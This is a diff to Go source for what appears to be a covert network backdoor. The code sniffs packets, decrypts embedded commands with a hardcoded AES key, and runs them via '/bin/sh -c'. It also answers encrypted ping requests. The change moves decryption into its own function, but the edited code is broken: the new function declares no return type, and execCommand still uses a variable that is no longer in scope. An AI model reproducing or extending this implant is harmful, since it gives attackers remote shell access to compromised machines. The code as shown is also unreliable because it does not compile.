@@ -361,11 +361,7 @@ func CreateTargetCommand(cmd string, ip string) (command string) {
 }
 // ======
 
-func execCommand(ciphertext string) {
-	// Only run command if we didn't just run it
-	if lastCmdRan != ciphertext {
-		// fmt.Println("[+] COMMAND:", command)
-		
+func decryptCommand(ciphertext string) {
 		// Decrypt Packet
 		key := []byte("pooppooppooppoop")
 		tmp := []byte(ciphertext)
@@ -376,6 +372,14 @@ func execCommand(ciphertext string) {
 			panic(err)
 		}
 		if debugCheck != "" { fmt.Printf("Decrypted: %s\n", command) }
+
+		return command
+	}
+
+func execCommand(command string) {
+	// Only run command if we didn't just run it
+	if lastCmdRan != ciphertext {
+		// fmt.Println("[+] COMMAND:", command)
 
 		// Run the command and get output
 		_, err2 := exec.Command("/bin/sh", "-c", command).CombinedOutput()
@@ -511,12 +515,13 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 	//Parse commands to run
 	if len(payload) > 3 {
 		cmd := payload[4]
-		execCommand(cmd)
+		execCommand(decryptCommand(cmd))
 	}
 
 	//get ping command
 	if len(payload) > 4 {
-		ping := payload[5]
+		if debugCheck != "" { fmt.Println("Paylod Received:",data) }
+		ping := decryptCommand(payload[5])
 		if ping != "" {
 			iface, src := GetOutwardIface("8.8.8.8:80")
 			srcMAC, err2 := net.ParseMAC(packet.NetworkLayer().NetworkFlow().Src().String())
